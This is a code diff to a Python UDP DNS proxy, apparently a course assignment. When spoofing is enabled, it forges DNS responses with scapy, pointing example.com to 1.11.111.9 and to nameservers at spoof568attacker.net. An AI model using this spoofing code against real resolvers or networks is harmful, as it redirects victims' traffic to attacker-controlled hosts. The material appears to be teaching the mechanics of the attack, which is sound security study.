@@ -27,7 +27,6 @@ BUFFER_SIZE = 4096
 
 if __name__ == "__main__":
     # Create UDP sockets for proxy
-    # FIXME connection failed when using ANY
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server.bind((LOCALHOST, port))
@@ -51,15 +50,14 @@ if __name__ == "__main__":
             print("Error! Received zero-length data")
             exit(1)
         '''=======================================Part3======================================='''
-        if (SPOOF): #FIXME not sure if this is ok, or we need to create new DNSRRs (Need to know the testcases)
+        if (SPOOF): 
             print("Spoofing the message...")
             # Parse the raw data to DNS packet
-            response_data = DNS(response_data)
-            # Spoof the IP address
-            response_data.an[0].rdata = '1.11.111.9'
-            # Change the name servers
-            response_data.ns[0].rdata = 'ns1.spoof568attacker.net'
-            response_data.ns[1].rdata = 'ns2.spoof568attacker.net'
+            odata = DNS (response_data)
+            an = DNSRR(rrname = "example.com.", rdata = "1.11.111.9", type = 'A')
+            ns1 = DNSRR(rrname = "example.com.", rdata = "ns1.spoof568attacker.net.", type='NS')
+            ns2 = DNSRR(rrname = "example.com.", rdata = "ns2.spoof568attacker.net.", type='NS')
+            response_data = DNS(id = odata.id, qd = odata.qd, an = an, ns = ns1/ns2)
             # Remove additional section
             response_data.arcount = 0
         '''==================================================================================='''
